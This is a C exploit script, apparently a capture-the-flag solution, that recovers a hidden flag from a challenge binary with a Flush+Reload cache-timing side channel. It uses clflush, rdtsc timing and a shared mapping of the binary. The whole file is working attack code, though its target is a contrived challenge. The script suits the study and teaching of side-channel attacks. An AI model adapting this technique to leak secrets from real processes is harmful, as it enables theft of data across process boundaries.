#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <x86intrin.h>

#define PAGE_SIZE 512
#define FLAG_SIZE 28

// Might need to change this depending on your 'chall' binary 
#define CHALL_FILE_SIZE 0x24ec8
// objdump -d ./chall -j .rodata | grep "the_array"
#define OFFSET_TO_THE_ARRAY 0x2020

const char *the_array;

static void *map_file(const char *file) {
    int fd = open(file, O_RDONLY, 0666);
	if (fd < 0){
        printf("Failed to open file");
        return NULL;
    }
    char *mem = mmap(NULL, CHALL_FILE_SIZE, PROT_READ, MAP_SHARED, fd, 0);
    if (mem == MAP_FAILED) { perror("mmap"); exit(-1); }
    return mem;
}

void access_value(char x) {
    /* Wrapper to prevent optimizations */
    (void)x;
}

/* Measure the access time to the_array[i * PAGE_SIZE]
 * for i in [0, 255] and return the value of i corresponding 
 * to the shortest access time  
 */
char get_min_access_time() {
    char best_candidate = 0;
    int min_time = 99999; 
    for(int j = 0; j <= 255; j++) {
        // Access in 'random' order to prevent stride optimization
        // which can  distort the timing results
        int i = ((j * 167) + 13) & 0xff;
        //int i = j;

		int before, after;

        before = __rdtsc(); 
        access_value(the_array[i * PAGE_SIZE]); 
        _mm_lfence(); // Makes sure 'after' is measured when 'access_value' is done
        after = __rdtsc();

        uint32_t diff = (uint32_t)(after-before); 

        // For some reason the leak is less accurate without the following line
        fprintf(stderr, "Access time : %c : %d\n", i, diff);

        if(diff < min_time){
            min_time = diff;
            best_candidate = i;
        }
    }
    return best_candidate;
}

/* Leak the char at baby_array[index].
 * We do it 10 times and return the char with highest score
 */
char leak_char(int index){

    uint8_t scores[256] = {0};

    for(int i = 0; i < 10; i++){ 
        // Flush the cache
        for(int j = 0; j < 256; j++) {
            _mm_clflush((void*)(the_array + j * PAGE_SIZE));
        }

        // Make the victim access the_array[baby_array[index] * PAGE_SIZE]
        char buf[4];
        sprintf(buf, "%2d\n", index);
        write (STDOUT_FILENO, buf, 3);
        scores[get_min_access_time()]++;
    }

    // Find the char with max score
    char leaked_char = 0;
    uint8_t highest_score = 0;
    for(int i = 0; i < 256; i++){
        if(scores[i] > highest_score){
            highest_score = scores[i];
            leaked_char = i;
        }
    }

    return leaked_char;
}

int main(int argc, char *const argv[]) {

    char leaked_flag [FLAG_SIZE + 1] = {0};

	the_array = (const char *) (map_file("./chall") + OFFSET_TO_THE_ARRAY);

    for(int i = 0; i < FLAG_SIZE; i++){
        leaked_flag [i] = leak_char(i + 48);
    }

    fprintf(stderr, "\nLeaked flag : %s\n",leaked_flag);
    return 0;
}
